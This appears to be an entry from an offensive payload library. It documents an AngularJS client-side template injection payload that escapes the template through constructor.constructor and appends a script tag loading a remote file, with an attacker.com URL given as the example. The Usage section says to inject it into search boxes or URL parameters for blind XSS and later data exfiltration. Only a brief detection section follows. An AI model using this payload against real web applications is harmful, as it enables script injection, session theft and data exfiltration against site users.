---
id: 0a712790-8307-48f0-9967-e055f0883824
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.760208+00:00'
updated_at: '2023-04-10T20:24:53.221835+00:00'
tags:
  - CSTI
  - Blind XSS
  - AngularJS
platforms:
  - Web
  - Browser
validated: true
---

# AngularJS-Constructor-Bypass-Script-Injection

## Code

```javascript
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}
```

## Description

This payload exploits Client-Side Template Injection in AngularJS by using the constructor function to evaluate arbitrary JavaScript, creating a script element that loads an external malicious file from an attacker-controlled server. It is designed for blind execution where no immediate feedback is visible.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost/m | URL of the attacker's malicious script | //attacker.com/payload.js |

## Usage

Inject this payload into a vulnerable AngularJS template input (e.g., search box or URL param). It breaks out of the template context to append a script tag to the DOM, loading the remote payload for further exploitation like data exfiltration.

## Detection

- Monitor for unexpected script element creations in DOM via browser dev tools or CSP violation reports.
- Network logs showing requests to unauthorized external domains from client-side scripts.
- AngularJS error logs for constructor misuse or template evaluation failures.

## Related

- [[procedures/Client-Side-Template-Injection-using-Blind-XSS]]
